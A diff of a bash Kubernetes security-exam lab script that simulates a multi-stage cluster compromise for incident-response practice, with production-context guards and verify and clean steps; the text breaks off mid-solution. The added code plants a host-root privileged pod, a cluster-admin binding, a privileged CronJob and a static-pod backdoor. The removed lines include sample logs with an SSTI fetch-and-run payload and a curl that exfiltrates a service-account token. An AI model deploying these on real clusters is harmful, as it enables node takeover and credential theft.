@@ -1,348 +1,560 @@
 #!/usr/bin/env bash
 #
-# CKS 1.34 - Dominio 6.3: Investigate and identify phases of attack and bad actors within the environment
-# Peso en el examen: 4
-# Referencia: https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
+# ==============================================================================
+#  CKS 1.34 — Domain 6: Monitoring, Logging and Runtime Security
+#  Topic 6.3 — Investigate and identify phases of attack and bad actors
+#              within the environment
+# ==============================================================================
 #
-# Break & Fix: simula el rastro dejado por un ataque real contra un
-# microservicio expuesto, para que practiques la reconstrucción de la
-# cadena de ataque (Cyber Kill Chain / MITRE ATT&CK for Containers) a
-# partir de logs y del estado del cluster.
+#  BREAK & FIX lab.  This script SIMULATES a multi-stage cluster compromise so
+#  that the student can practise incident investigation: enumerate the artifacts
+#  a bad actor left behind, map each one to a phase of the attack lifecycle
+#  (MITRE ATT&CK for Containers), and remediate surgically.
 #
-# SOLO para una VM de laboratorio descartable (kind/minikube/k3d). No
-# habilita audit logging real en el API server: genera evidencia
-# sintética pero realista (logs + objetos reales inofensivos) para que
-# la investigación sea end-to-end sin tocar la configuración del
-# control plane.
+#  >>> RUN ONLY ON A DISPOSABLE, SINGLE-NODE KUBERNETES LAB VM <<<
+#  (kubeadm / kind / minikube).  It creates privileged pods, a cluster-admin
+#  binding, a kube-system CronJob and — if it can — a rogue static Pod manifest
+#  on the node.  Nothing here beacons to the Internet or destroys host data:
+#  the "malicious" workloads only write to /tmp inside their own containers and
+#  mount the host filesystem to *demonstrate* a node-escape indicator.  Even so,
+#  never point it at a cluster you care about.
+#
+#  Usage:
+#     ./break_fix.sh break     # plant the attack + print the incident briefing
+#     ./break_fix.sh verify     # self-grade: did you remediate every artifact?
+#     ./break_fix.sh clean      # instructor reset (also IS the fix; see bottom)
+#
+#  Skip the interactive guard in automation with:  CONFIRM=yes ./break_fix.sh break
+#
+#  References (original summaries only; consult the sources directly):
+#   - CKS Curriculum v1.34
+#       https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
+#   - Kubernetes — Auditing
+#       https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
+#   - Kubernetes — Static Pods
+#       https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/
+#   - Kubernetes — Security Checklist
+#       https://kubernetes.io/docs/concepts/security/security-checklist/
+#   - MITRE ATT&CK — Containers matrix
+#       https://attack.mitre.org/matrices/enterprise/containers/
+#   - Microsoft — Threat matrix for Kubernetes
+#       https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/
+#   - Falco — Runtime security
+#       https://falco.org/docs/
+# ==============================================================================
 
 set -euo pipefail
 
-LAB_NS="cks-6-3-lab"
-VICTIM_NS="payments"
-LAB_DIR="${HOME}/cks-lab/6.3-investigate-attack"
-AUDIT_LOG="${LAB_DIR}/kube-audit.log"
-ACCESS_LOG="${LAB_DIR}/frontend-web-access.log"
-APP_LOG="${LAB_DIR}/frontend-web-container.log"
+# ------------------------------------------------------------------------------
+# Configuration — names of the artifacts the "bad actor" plants.
+# ------------------------------------------------------------------------------
+NS="dev"                                   # victim namespace (relabelled by attacker)
+IMAGE="${IMAGE:-busybox:1.36}"             # override if your lab has no egress
+LEGIT_DEPLOY="payment-api"                 # benign workload = noise, DO NOT delete
+BEACHHEAD_POD="support-tools"              # malicious foothold pod
+ATTACKER_SA="support-sa"                   # rogue ServiceAccount
+ATTACKER_CRB="support-sa-cluster-admin"    # rogue cluster-admin binding
+ATTACKER_CRON="metrics-collector"          # persistence CronJob in kube-system
+EXFIL_SECRET="exfil-token"                 # stashed stolen credential
+STATIC_POD="kube-proxy-audit"              # node-level static-pod persistence
+MANIFEST_DIR="${MANIFEST_DIR:-/etc/kubernetes/manifests}"
+STATIC_MANIFEST="${MANIFEST_DIR}/${STATIC_POD}.yaml"
 
-require_lab_context() {
-  command -v kubectl >/dev/null 2>&1 || { echo "Falta kubectl."; exit 1; }
-  local ctx
-  ctx="$(kubectl config current-context 2>/dev/null || echo "")"
-  if [[ -z "$ctx" ]]; then
-    echo "No hay contexto de kubectl activo. Abortando."
-    exit 1
+# ------------------------------------------------------------------------------
+# Pretty logging.
+# ------------------------------------------------------------------------------
+if [ -t 1 ]; then
+  R=$'\033[0m'; B=$'\033[1m'; RED=$'\033[31m'; GRN=$'\033[32m'; YEL=$'\033[33m'; CYN=$'\033[36m'
+else
+  R=""; B=""; RED=""; GRN=""; YEL=""; CYN=""
+fi
+info()  { printf '%s[*]%s %s\n' "$CYN" "$R" "$*"; }
+ok()    { printf '%s[+]%s %s\n' "$GRN" "$R" "$*"; }
+warn()  { printf '%s[!]%s %s\n' "$YEL" "$R" "$*"; }
+die()   { printf '%s[x]%s %s\n' "$RED" "$R" "$*" >&2; exit 1; }
+
+kc() { kubectl "$@"; }
+
+# ------------------------------------------------------------------------------
+# Safety guards.
+# ------------------------------------------------------------------------------
+preflight() {
+  command -v kubectl >/dev/null 2>&1 || die "kubectl not found in PATH."
+  kc cluster-info >/dev/null 2>&1 || die "kubectl cannot reach a cluster. Check your kubeconfig/context."
+
+  local ctx; ctx="$(kc config current-context 2>/dev/null || echo unknown)"
+  if printf '%s' "$ctx" | grep -qiE 'prod|production|live'; then
+    die "Current context '$ctx' looks like PRODUCTION. Refusing to run. Switch contexts first."
   fi
-  if [[ "${LAB_FORCE:-0}" != "1" ]] && ! [[ "$ctx" =~ (kind|minikube|k3d|k3s|docker-desktop|lab|test) ]]; then
-    echo "El contexto actual es '$ctx' y no parece un cluster de laboratorio descartable."
-    echo "Si estás seguro de que es seguro, reejecutá con LAB_FORCE=1."
-    exit 1
+
+  info "Target context: ${B}${ctx}${R}"
+  if [ "${CONFIRM:-}" != "yes" ]; then
+    if [ -t 0 ]; then
+      read -r -p "This will DELIBERATELY compromise this cluster. Type 'break' to continue: " a
+      [ "$a" = "break" ] || die "Aborted."
+    else
+      die "Non-interactive run: set CONFIRM=yes to acknowledge this is a disposable lab."
+    fi
   fi
-  echo "Usando contexto: $ctx"
 }
 
-ts() { date -u -d "@$((START + $1))" +"%Y-%m-%dT%H:%M:%SZ"; }
-ts_clf() { date -u -d "@$((START + $1))" +"%d/%b/%Y:%H:%M:%S +0000"; }
+# ------------------------------------------------------------------------------
+# BREAK — plant the multi-phase compromise.
+# ------------------------------------------------------------------------------
+plant() {
+  preflight
 
-break_lab() {
-  mkdir -p "$LAB_DIR"
+  info "Phase 0 — staging: creating victim namespace and a legitimate workload (noise)."
+  # Defense Evasion (T1610-ish): attacker weakens Pod Security so privileged
+  # pods can be scheduled here, then hides malicious pods among legit ones.
+  cat <<EOF | kc apply -f - >/dev/null
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: ${NS}
+  labels:
+    pod-security.kubernetes.io/enforce: privileged
+    pod-security.kubernetes.io/warn: privileged
+    pod-security.kubernetes.io/audit: privileged
+EOF
 
-  kubectl create namespace "$LAB_NS" --dry-run=client -o yaml | kubectl apply -f - >/dev/null
-  kubectl create namespace "$VICTIM_NS" --dry-run=client -o yaml | kubectl apply -f - >/dev/null
+  cat <<EOF | kc apply -f - >/dev/null
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ${LEGIT_DEPLOY}
+  namespace: ${NS}
+  labels: { app: payment-api }
+spec:
+  replicas: 2
+  selector: { matchLabels: { app: payment-api } }
+  template:
+    metadata: { labels: { app: payment-api } }
+    spec:
+      containers:
+      - name: api
+        image: ${IMAGE}
+        command: ["/bin/sh","-c","while true; do sleep 3600; done"]
+        securityContext:
+          allowPrivilegeEscalation: false
+          runAsNonRoot: true
+          runAsUser: 10001
+EOF
 
-  # --- Vulnerabilidad raíz: la ServiceAccount del frontend tiene cluster-admin ---
-  kubectl apply -f - >/dev/null <<'YAML'
+  info "Phase 1 — Initial Access / Privilege Escalation: rogue ServiceAccount bound to cluster-admin."
+  # Persistence + Privilege Escalation: a Secret-backed identity that survives
+  # pod restarts and grants full cluster control.
+  cat <<EOF | kc apply -f - >/dev/null
 apiVersion: v1
 kind: ServiceAccount
 metadata:
-  name: frontend-web-sa
-  namespace: cks-6-3-lab
+  name: ${ATTACKER_SA}
+  namespace: ${NS}
 ---
 apiVersion: rbac.authorization.k8s.io/v1
 kind: ClusterRoleBinding
 metadata:
-  name: frontend-web-full-access
-subjects:
-  - kind: ServiceAccount
-    name: frontend-web-sa
-    namespace: cks-6-3-lab
+  name: ${ATTACKER_CRB}
+  labels: { app.kubernetes.io/managed-by: support-tooling }
 roleRef:
+  apiGroup: rbac.authorization.k8s.io
   kind: ClusterRole
   name: cluster-admin
-  apiGroup: rbac.authorization.k8s.io
-YAML
+subjects:
+- kind: ServiceAccount
+  name: ${ATTACKER_SA}
+  namespace: ${NS}
+EOF
 
-  # --- App pública vulnerable (punto de entrada) ---
-  kubectl apply -f - >/dev/null <<'YAML'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: frontend-web
-  namespace: cks-6-3-lab
-  labels:
-    app: frontend-web
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: frontend-web
-  template:
-    metadata:
-      labels:
-        app: frontend-web
-    spec:
-      serviceAccountName: frontend-web-sa
-      containers:
-        - name: frontend-web
-          image: busybox:1.36
-          command: ["sh", "-c", "sleep infinity"]
-YAML
-
-  # --- Servicio "víctima" en otro namespace (para la fase de lateral movement) ---
-  kubectl apply -f - >/dev/null <<'YAML'
+  info "Phase 2 — Execution / Node access: privileged, hostPID beachhead pod mounting the host root."
+  # Execution (T1610 Deploy Container) + Escape to Host (T1611): privileged,
+  # hostPID/hostNetwork, hostPath '/' mounted read-write. Labelled 'app=payment-api'
+  # to blend in with the legitimate Deployment (Defense Evasion via masquerading).
+  cat <<EOF | kc apply -f - >/dev/null
 apiVersion: v1
-kind: Secret
+kind: Pod
 metadata:
-  name: db-credentials
-  namespace: payments
-type: Opaque
-stringData:
-  username: payments_svc
-  password: sample-not-a-real-secret
----
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: payments-api
-  namespace: payments
-  labels:
-    app: payments-api
+  name: ${BEACHHEAD_POD}
+  namespace: ${NS}
+  labels: { app: payment-api }
 spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: payments-api
-  template:
-    metadata:
-      labels:
-        app: payments-api
-    spec:
-      containers:
-        - name: payments-api
-          image: busybox:1.36
-          command: ["sh", "-c", "sleep infinity"]
-YAML
+  serviceAccountName: ${ATTACKER_SA}
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: shell
+    image: ${IMAGE}
+    command: ["/bin/sh","-c","while true; do echo \"beacon \$(date -u)\" >> /tmp/.beacon.log; sleep 30; done"]
+    securityContext:
+      privileged: true
+      runAsUser: 0
+    volumeMounts:
+    - { name: hostroot, mountPath: /host }
+  volumes:
+  - name: hostroot
+    hostPath: { path: /, type: Directory }
+EOF
 
-  # --- Persistencia: CronJob disfrazado de tarea legítima ---
-  kubectl apply -f - >/dev/null <<'YAML'
+  info "Phase 3 — Credential Access: stolen token stashed as a Secret in ${NS}."
+  # Collection/Credential Access: attacker parks an exfiltrated token in-cluster.
+  kc -n "$NS" create secret generic "$EXFIL_SECRET" \
+     --from-literal=stolen_sa_token="eyJhbGciOiJSUzI1NiIsImtpZCI6IkZBS0UtRVhGSUwtVE9LRU4ifQ.FAKE.FAKE" \
+     --dry-run=client -o yaml | kc apply -f - >/dev/null
+
+  info "Phase 4 — Persistence (scheduled): privileged CronJob hiding in kube-system."
+  # Persistence (Scheduled Task/Job): re-establishes a privileged foothold every
+  # minute, named to look like a platform component.
+  cat <<EOF | kc apply -f - >/dev/null
 apiVersion: batch/v1
 kind: CronJob
 metadata:
-  name: cache-warmup
-  namespace: cks-6-3-lab
+  name: ${ATTACKER_CRON}
+  namespace: kube-system
+  labels: { k8s-app: metrics-collector }
 spec:
-  schedule: "*/5 * * * *"
+  schedule: "*/1 * * * *"
+  concurrencyPolicy: Forbid
   jobTemplate:
     spec:
       template:
         spec:
-          restartPolicy: OnFailure
+          hostPID: true
+          restartPolicy: Never
           containers:
-            - name: cache-warmup
-              image: busybox:1.36
-              command: ["sh", "-c", "echo heartbeat $(date) >> /tmp/.cache-state"]
-YAML
+          - name: collector
+            image: ${IMAGE}
+            command: ["/bin/sh","-c","echo persistence beacon; sleep 20"]
+            securityContext:
+              privileged: true
+              runAsUser: 0
+            volumeMounts:
+            - { name: hostroot, mountPath: /host }
+          volumes:
+          - name: hostroot
+            hostPath: { path: / }
+EOF
 
-  # --- Escalada de privilegios: pod con hostPath "/" y hostPID ---
-  kubectl apply -f - >/dev/null <<'YAML'
+  info "Phase 5 — Persistence (node): attempting to plant a rogue static Pod manifest."
+  # Persistence via static Pod: kubelet auto-runs any manifest in the manifests
+  # dir; it survives 'kubectl delete' because the file, not the API server, is
+  # the source of truth. Guarded — needs write access (root) to the node dir.
+  if [ -d "$MANIFEST_DIR" ]; then
+    local wrote=0
+    if [ -w "$MANIFEST_DIR" ]; then
+      write_static_pod | tee "$STATIC_MANIFEST" >/dev/null && wrote=1
+    elif command -v sudo >/dev/null 2>&1 && sudo -n true >/dev/null 2>&1; then
+      write_static_pod | sudo tee "$STATIC_MANIFEST" >/dev/null && wrote=1
+    fi
+    if [ "$wrote" = 1 ]; then
+      ok "Static Pod manifest written: ${STATIC_MANIFEST} (mirror Pod will appear in kube-system)."
+    else
+      warn "No write access to ${MANIFEST_DIR}; skipped node persistence. Re-run with sudo for the full lab."
+    fi
+  else
+    warn "${MANIFEST_DIR} not present (not a kubeadm node?); skipped the static-Pod phase."
+  fi
+
+  briefing
+}
+
+write_static_pod() {
+  cat <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
-  name: node-debug-tools
-  namespace: cks-6-3-lab
-  labels:
-    purpose: debug
+  name: ${STATIC_POD}
+  namespace: kube-system
+  labels: { component: kube-proxy-audit, tier: node }
 spec:
-  hostPID: true
+  hostNetwork: true
+  priorityClassName: system-node-critical
   containers:
-    - name: node-debug-tools
-      image: busybox:1.36
-      command: ["sh", "-c", "sleep infinity"]
-      volumeMounts:
-        - name: hostroot
-          mountPath: /host
-  volumes:
-    - name: hostroot
-      hostPath:
-        path: /
-        type: Directory
-YAML
-
-  kubectl wait --for=condition=Ready pod -l purpose=debug -n "$LAB_NS" --timeout=60s >/dev/null 2>&1 || true
-
-  # --- Evidencia de la fase de escalada dejada en el "nodo" vía el hostPath ---
-  kubectl exec -n "$LAB_NS" node-debug-tools -- sh -c 'echo "# dropped via hostPath, revisar" > /host/tmp/.systemd-helper 2>/dev/null' >/dev/null 2>&1 || true
-
-  # --- Línea de tiempo sintética: hace 20 minutos ---
-  START=$(( $(date +%s) - 1200 ))
-
-  # 1) Initial access / execution: RCE vía SSTI en el frontend público
-  cat > "$ACCESS_LOG" <<EOF
-203.0.113.66 - - [$(ts_clf 0)] "GET /api/render?tpl=%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D HTTP/1.1" 200 512 "-" "python-requests/2.31.0"
-203.0.113.66 - - [$(ts_clf 15)] "GET /api/render?tpl=%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('curl+-s+http://198.51.100.23/stage2.sh+|sh').read()%7D%7D HTTP/1.1" 200 480 "-" "python-requests/2.31.0"
-EOF
-
-  cat > "$APP_LOG" <<EOF
-$(ts 15) INFO  rendering template request from 203.0.113.66
-$(ts 16) WARN  unexpected shell invocation detected in template engine
-$(ts 280) INFO  curl -s -X POST https://198.51.100.23/collect --data-binary @/var/run/secrets/kubernetes.io/serviceaccount/token
-$(ts 281) INFO  exfil response: 200 OK (247 bytes sent)
-EOF
-
-  # 2) Discovery -> 3) Credential access -> 4) Lateral movement -> 5) Persistence
-  #    -> 6) Privilege escalation -> 7) Defense evasion, vistos desde el audit log
-  {
-    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0001","stage":"ResponseComplete","requestURI":"/api/v1/secrets","verb":"list","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"secrets","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 30)" "$(ts 30)"
-    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0002","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/payments/secrets/db-credentials","verb":"get","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"secrets","namespace":"payments","name":"db-credentials","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 45)" "$(ts 45)"
-    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0003","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/payments/pods/payments-api-7c9d4f8b7-k2x9q/exec","verb":"create","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"pods","subresource":"exec","namespace":"payments","name":"payments-api-7c9d4f8b7-k2x9q","apiVersion":"v1"},"responseStatus":{"code":101},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 70)" "$(ts 70)"
-    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0004","stage":"ResponseComplete","requestURI":"/apis/batch/v1/namespaces/cks-6-3-lab/cronjobs","verb":"create","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"cronjobs","namespace":"cks-6-3-lab","name":"cache-warmup","apiVersion":"batch/v1"},"responseStatus":{"code":201},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 150)" "$(ts 150)"
-    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0005","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/cks-6-3-lab/pods","verb":"create","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"pods","namespace":"cks-6-3-lab","name":"node-debug-tools","apiVersion":"v1"},"responseStatus":{"code":201},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 200)" "$(ts 200)"
-    printf '{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a1b2c3d4-0006","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/cks-6-3-lab/events","verb":"deletecollection","user":{"username":"system:serviceaccount:cks-6-3-lab:frontend-web-sa","groups":["system:serviceaccounts","system:serviceaccounts:cks-6-3-lab","system:authenticated"]},"sourceIPs":["10.244.1.7"],"objectRef":{"resource":"events","namespace":"cks-6-3-lab","apiVersion":"v1"},"responseStatus":{"code":200},"requestReceivedTimestamp":"%s","stageTimestamp":"%s"}\n' "$(ts 260)" "$(ts 260)"
-  } > "$AUDIT_LOG"
-
-  cat <<EOF
-
-============================================================
- INCIDENTE DETECTADO - namespace '$LAB_NS' (y '$VICTIM_NS')
-============================================================
-
-Síntoma: apareció actividad inesperada en el cluster. Tenés
-tres fuentes de evidencia en:
-
-  $LAB_DIR/
-    ├── frontend-web-access.log   (logs del ingress/app pública)
-    ├── frontend-web-container.log (stdout del contenedor frontend-web)
-    └── kube-audit.log             (audit log del API server, formato audit.k8s.io/v1)
-
-Además el cluster tiene objetos reales que podés inspeccionar con:
-
-  kubectl get all,cronjob,rolebinding,clusterrolebinding -n $LAB_NS
-  kubectl get clusterrolebinding -o wide | grep frontend-web
-  kubectl get secret,deploy -n $VICTIM_NS
-
-TU TAREA (investigación, sin automatizar el arreglo):
-
-  1. Reconstruí la cadena de ataque cruzando los 3 logs y mapeá
-     cada evento a una fase (Cyber Kill Chain / MITRE ATT&CK for
-     Containers): Initial Access, Execution, Discovery,
-     Credential Access, Lateral Movement, Persistence,
-     Privilege Escalation, Defense Evasion, Exfiltration.
-  2. Identificá a los "bad actors": la IP externa del atacante,
-     la IP de destino de la exfiltración, y la identidad interna
-     comprometida (ServiceAccount y su origen: qué pod, qué IP
-     de pod usó para hablar con el API server).
-  3. Encontrá qué permiso mal configurado permitió que el
-     compromiso de un solo pod terminara en control total del
-     cluster.
-  4. Remediá: eliminá los objetos maliciosos que quedaron vivos
-     en el cluster y quitá el permiso excesivo que hizo posible
-     la escalada, sin romper la app legítima (payments-api debe
-     seguir funcionando).
-
-Se considera resuelto cuando:
-  - No queda ningún CronJob ni Pod sospechoso (con hostPath o
-    de nombre 'node-debug-tools'/'cache-warmup') en '$LAB_NS'.
-  - 'kubectl auth can-i --list --as=system:serviceaccount:$LAB_NS:frontend-web-sa'
-    ya NO muestra privilegios de cluster-admin.
-  - El namespace '$VICTIM_NS' y su Deployment 'payments-api' siguen intactos.
-
+  - name: pause
+    image: registry.k8s.io/pause:3.9
 EOF
 }
 
-break_lab_wrapper() {
-  require_lab_context
-  break_lab
+# ------------------------------------------------------------------------------
+# Incident briefing shown to the student.
+# ------------------------------------------------------------------------------
+briefing() {
+  cat <<'TXT'
+
+================================================================================
+                        SECURITY INCIDENT — BRIEFING
+================================================================================
+At 02:14 UTC your runtime sensor fired. A privileged container with hostPID was
+observed reading the node filesystem, and RBAC changes were logged shortly
+after. You are the on-call responder. The attacker is still assumed present.
+
+WHAT YOU WILL SEE (the symptoms)
+  - An unexpected Pod running privileged / hostPID / hostNetwork in a workload
+    namespace, mounting the host root ('/') — a classic node-escape indicator.
+  - A ClusterRoleBinding granting cluster-admin to a ServiceAccount that no
+    platform component should own.
+  - A CronJob in kube-system that spins up a privileged Pod every minute.
+  - Possibly a Pod in kube-system whose name ends in your node's hostname but
+    that has NO owning controller and cannot be deleted normally (static Pod).
+  - A Secret in a workload namespace holding a stolen token.
+  - A namespace whose Pod Security 'enforce' level was lowered to 'privileged'.
+
+YOUR OBJECTIVES (what "fixed" means)
+  1. INVESTIGATE. Reconstruct the kill chain and map each artifact to a phase:
+     Initial Access -> Execution -> Privilege Escalation -> Credential Access
+     -> Persistence -> Defense Evasion. Write down which object belongs where.
+  2. CONTAIN & ERADICATE, SURGICALLY. Remove every attacker artifact:
+       * the beachhead Pod, the rogue ServiceAccount and its cluster-admin CRB,
+       * the kube-system CronJob, the stolen-token Secret,
+       * the rogue static Pod (delete the MANIFEST FILE on the node, not just
+         the mirror Pod), and
+       * restore the namespace's Pod Security enforce level (baseline/restricted).
+     Do NOT delete the legitimate 'payment-api' Deployment — a good responder
+     removes the threat without taking down production.
+
+Self-grade any time with:   ./break_fix.sh verify
+Full walkthrough is at the bottom of this script (commented out) — try first.
+================================================================================
+TXT
 }
 
-break_lab_wrapper "$@"
+# ------------------------------------------------------------------------------
+# VERIFY — grade the student's remediation.
+# ------------------------------------------------------------------------------
+verify() {
+  command -v kubectl >/dev/null 2>&1 || die "kubectl not found."
+  local fails=0
 
-# ============================================================
-# SOLUCIÓN PASO A PASO (comentado - no se ejecuta)
-# ============================================================
+  check_absent() { # <desc> <kubectl get args...>
+    local desc="$1"; shift
+    if kc "$@" >/dev/null 2>&1; then
+      printf '%s[FAIL]%s %s still present.\n' "$RED" "$R" "$desc"; fails=$((fails+1))
+    else
+      printf '%s[PASS]%s %s removed.\n' "$GRN" "$R" "$desc"
+    fi
+  }
+
+  check_absent "Beachhead Pod ${NS}/${BEACHHEAD_POD}"      -n "$NS" get pod "$BEACHHEAD_POD"
+  check_absent "Rogue ServiceAccount ${NS}/${ATTACKER_SA}" -n "$NS" get sa "$ATTACKER_SA"
+  check_absent "cluster-admin binding ${ATTACKER_CRB}"     get clusterrolebinding "$ATTACKER_CRB"
+  check_absent "kube-system CronJob ${ATTACKER_CRON}"      -n kube-system get cronjob "$ATTACKER_CRON"
+  check_absent "Stolen-token Secret ${NS}/${EXFIL_SECRET}" -n "$NS" get secret "$EXFIL_SECRET"
+
+  # Belt-and-suspenders: no ClusterRoleBinding may still bind our SA to admin.
+  if kc get clusterrolebindings -o jsonpath="{range .items[?(@.roleRef.name=='cluster-admin')]}{.subjects[*].name}{'\n'}{end}" 2>/dev/null | grep -q "$ATTACKER_SA"; then
+    printf '%s[FAIL]%s A cluster-admin binding still references %s.\n' "$RED" "$R" "$ATTACKER_SA"; fails=$((fails+1))
+  else
+    printf '%s[PASS]%s No cluster-admin binding references the rogue SA.\n' "$GRN" "$R"
+  fi
+
+  # Static Pod: the FILE is the source of truth; also confirm the mirror Pod is gone.
+  if [ -e "$STATIC_MANIFEST" ]; then
+    printf '%s[FAIL]%s Static Pod manifest %s still on the node.\n' "$RED" "$R" "$STATIC_MANIFEST"; fails=$((fails+1))
+  elif kc -n kube-system get pods -o name 2>/dev/null | grep -q "/${STATIC_POD}-"; then
+    printf '%s[FAIL]%s Static mirror Pod %s* still running (delete the manifest FILE).\n' "$RED" "$R" "$STATIC_POD"; fails=$((fails+1))
+  else
+    printf '%s[PASS]%s Node static-Pod persistence removed.\n' "$GRN" "$R"
+  fi
+
+  # Defense evasion undone: namespace must no longer enforce 'privileged'.
+  local enf; enf="$(kc get ns "$NS" -o jsonpath='{.metadata.labels.pod-security\.kubernetes\.io/enforce}' 2>/dev/null || true)"
+  if [ "$enf" = "privileged" ]; then
+    printf '%s[FAIL]%s Namespace %s still enforces Pod Security level "privileged".\n' "$RED" "$R" "$NS"; fails=$((fails+1))
+  else
+    printf '%s[PASS]%s Namespace %s Pod Security restored (enforce="%s").\n' "$GRN" "$R" "$NS" "${enf:-<none>}"
+  fi
+
+  # Surgical remediation: legit workload must survive.
+  if kc -n "$NS" get deploy "$LEGIT_DEPLOY" >/dev/null 2>&1; then
+    printf '%s[PASS]%s Legitimate workload %s/%s preserved.\n' "$GRN" "$R" "$NS" "$LEGIT_DEPLOY"
+  else
+    printf '%s[FAIL]%s You deleted the legitimate Deployment %s/%s — remediate surgically.\n' "$RED" "$R" "$NS" "$LEGIT_DEPLOY"; fails=$((fails+1))
+  fi
+
+  echo
+  if [ "$fails" -eq 0 ]; then
+    ok "ALL CHECKS PASSED — environment eradicated and hardened. Incident closed."
+  else
+    die "$fails check(s) failing. Keep investigating — the bad actor still has a foothold."
+  fi
+}
+
+# ------------------------------------------------------------------------------
+# CLEAN — instructor reset. This is exactly the remediation the student performs.
+# ------------------------------------------------------------------------------
+clean() {
+  command -v kubectl >/dev/null 2>&1 || die "kubectl not found."
+  info "Eradicating attacker artifacts..."
+  kc -n "$NS" delete pod "$BEACHHEAD_POD"         --ignore-not-found >/dev/null 2>&1 || true
+  kc delete clusterrolebinding "$ATTACKER_CRB"    --ignore-not-found >/dev/null 2>&1 || true
+  kc -n "$NS" delete sa "$ATTACKER_SA"            --ignore-not-found >/dev/null 2>&1 || true
+  kc -n kube-system delete cronjob "$ATTACKER_CRON" --ignore-not-found >/dev/null 2>&1 || true
+  kc -n "$NS" delete secret "$EXFIL_SECRET"       --ignore-not-found >/dev/null 2>&1 || true
+  kc label ns "$NS" \
+     pod-security.kubernetes.io/enforce=baseline \
+     pod-security.kubernetes.io/warn=baseline \
+     pod-security.kubernetes.io/audit=baseline --overwrite >/dev/null 2>&1 || true
+
+  if [ -e "$STATIC_MANIFEST" ]; then
+    if [ -w "$STATIC_MANIFEST" ] || [ -w "$MANIFEST_DIR" ]; then
+      rm -f "$STATIC_MANIFEST"
+    elif command -v sudo >/dev/null 2>&1; then
+      sudo rm -f "$STATIC_MANIFEST"
+    fi
+    ok "Removed static Pod manifest ${STATIC_MANIFEST}."
+  fi
+  ok "Cleanup complete. Run './break_fix.sh verify' to confirm."
+}
+
+usage() {
+  cat <<TXT
+CKS 6.3 break & fix — investigate and identify phases of attack.
+
+  ${0##*/} break     Plant the simulated compromise and print the briefing.
+  ${0##*/} verify    Check whether every attacker artifact has been remediated.
+  ${0##*/} clean     Reset the lab (this is also the reference remediation).
+
+Env:  CONFIRM=yes  IMAGE=<img>  MANIFEST_DIR=/etc/kubernetes/manifests
+TXT
+}
+
+main() {
+  case "${1:-}" in
+    break|"") plant ;;
+    verify)   verify ;;
+    clean)    clean ;;
+    -h|--help|help) usage ;;
+    *) usage; die "Unknown command: $1" ;;
+  esac
+}
+
+main "$@"
+
+# ==============================================================================
+#  SOLUTION — step-by-step investigation and remediation (try before reading!)
+# ==============================================================================
 #
-# 1) Reconstrucción de la línea de tiempo (fases del ataque):
+#  Mindset: you are reconstructing an attack from the evidence it left, exactly
+#  as CKS 6.3 asks. Work outside-in: broad triage first, then confirm each
+#  artifact, map it to a phase, and only then eradicate.
 #
-#    - Initial Access / Execution (t+0 a t+16s, frontend-web-access.log
-#      y frontend-web-container.log): la IP externa 203.0.113.66 explota
-#      una inyección SSTI en /api/render para ejecutar comandos dentro
-#      del contenedor 'frontend-web'.
+#  ------------------------------------------------------------------------------
+#  STEP 1 — Triage: what is running that should not be?
+#  ------------------------------------------------------------------------------
+#    # Every Pod, everywhere, with the security-relevant columns exposed:
+#    kubectl get pods -A -o wide
+#    kubectl get pods -A -o custom-columns=\
+#'NS:.metadata.namespace,POD:.metadata.name,'\
